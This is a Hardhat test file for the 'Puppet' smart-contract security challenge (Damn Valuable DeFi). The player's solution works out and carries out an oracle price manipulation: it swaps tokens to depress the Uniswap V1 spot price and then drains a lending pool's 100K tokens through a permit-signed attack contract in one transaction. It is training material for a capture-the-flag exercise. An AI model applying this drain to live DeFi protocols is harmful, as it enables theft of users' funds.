const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { time } = require('@nomicfoundation/hardhat-network-helpers');
const ethJsUtil = require('ethereumjs-util');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

const rlp = require("rlp");
const keccak = require("keccak");

async function predictContractAddress(deployer) {

  const nonce = await ethers.provider.getTransactionCount(deployer.address); //The nonce must be a hex literal!
  const sender = deployer.address; //Requires a hex string as input!

  const input_arr = [sender, nonce];
  const rlp_encoded = rlp.encode(input_arr);

  const contract_address_long = keccak("keccak256")
    .update(rlp_encoded)
    .digest("hex");

  const contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
  return contract_address;
}

async function doArbitrage(value, ...params) {
  const chainId = (await ethers.provider.getNetwork()).chainId;
  // set the domain parameters
  const domain = {
    name: await token.name(),
    version: "1",
    chainId: chainId,
    verifyingContract: token.address
  };

  // set the Permit type parameters
  const types = {
    Permit: [{
        name: "owner",
        type: "address"
      },
      {
        name: "spender",
        type: "address"
      },
      {
        name: "value",
        type: "uint256"
      },
      {
        name: "nonce",
        type: "uint256"
      },
      {
        name: "deadline",
        type: "uint256"
      },
    ],
  };

  const predictedAddress = await predictContractAddress(player);
  console.log("predicted address: " + predictedAddress);

  const deadline = (await time.latest()) + 9999999;
  const values = {
    owner: player.address,
    spender: predictedAddress,
    value: PLAYER_INITIAL_TOKEN_BALANCE,
    nonce: await token.nonces(player.address),
    deadline: deadline,
  };
  const signature = await player._signTypedData(domain, types, values);
  const sig = ethers.utils.splitSignature(signature);

  const arbitrageContract = await (await ethers.getContractFactory('Arbitrage', player)).deploy(...params, sig.v, sig.r, sig.s, { value });

  console.log(`Actual address: ${arbitrageContract.address}`);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
      // pool has 100K DVT tokens and 0 ETH balance
      // player have to take all tokens from pool in a single transaction
      // player can only call borrow funstion
      // player should provide calculateDepositRequired(100K DVT) ETh to bowwor all tokens
      const uniswapExchangeEthBalance = await ethers.provider.getBalance(uniswapExchange.address);
      const uniswapExchangeTokenBalance = await token.balanceOf(uniswapExchange.address);
      const oraclePrice = uniswapExchangeEthBalance * (10 ** 18) / uniswapExchangeTokenBalance;
      console.log(`uniswapExchange balance is ${uniswapExchangeEthBalance}`);
      console.log(`uniswapExchange token balance is ${uniswapExchangeTokenBalance}`);
      console.log(`Oracle price is ${oraclePrice}`);
      console.log(`Deposit required is ${await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}`)

      // initially exchange price is 10^18
      // so 2 ETH have to be deposited per each DVT
      // that would be 200K ETH
      // player only has 25ETH and 1K DVT tokens
      // minimal deposit to borrow 100K DVT tokens is 24ETH - as player also pays transaction fee
      // oracle price should be less than: 100K * x * 2 = 24 => x = 12 /100 = 0.12
      // I should set oracle price to less than 0.12
      // exchETH * 10^18 / exchDVT = 0.12 => exchDVT * 0.12 = echhETH * 10^18 => exchDVT = exchETH * 8.33333 * 10^18
      // let's set exchDVT = exchETH * 10 * 10^18
      // let's swap tokens in pool to manipulate oracle price
      // Pool: 10 DVT and 10 ETH
      // Player: 1000DVT and 25 ETH
      // Oracle price: 10^18
      // To lower the price we should have less ETH and more tokens
      // Swap eth to tokens will lower the price
      // Add tokens will also lower the price but addLiquidity preserves ration - thus this is not an option
      // 



      /// Solution starts
        //await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
        //const deadline = await time.latest();
        //console.log(`Deadline is: ${deadline}`);
        //await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline + 9999999);
        //const depositValue = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        //console.log(`Deposit required is ${depositValue}`);
        //await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: depositValue});
      /// solution ends

      //await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, { value: 24n * 10n ** 18n,  gasLimit: 30000000 });

    const chainId = (await ethers.provider.getNetwork()).chainId;
    // set the domain parameters
    const domain = {
      name: await token.name(),
      version: "1",
      chainId: chainId,
      verifyingContract: token.address
    };
  
    // set the Permit type parameters
    const types = {
      Permit: [{
          name: "owner",
          type: "address"
        },
        {
          name: "spender",
          type: "address"
        },
        {
          name: "value",
          type: "uint256"
        },
        {
          name: "nonce",
          type: "uint256"
        },
        {
          name: "deadline",
          type: "uint256"
        },
      ],
    };

    const predictedAddress = await predictContractAddress(player);
    console.log("predicted address: " + predictedAddress);

    const deadline = (await time.latest()) + 9999999;
    const values = {
      owner: player.address,
      spender: predictedAddress,
      value: PLAYER_INITIAL_TOKEN_BALANCE,
      nonce: 0,
      deadline: deadline,
    };
    const signature = await player._signTypedData(domain, types, values);
    const sig = ethers.utils.splitSignature(signature);

    const crackPuppet = await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, deadline, sig.v, sig.r, sig.s, {value: 24n * 10n ** 18n });

    console.log(`Actual address: ${crackPuppet.address}`);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});
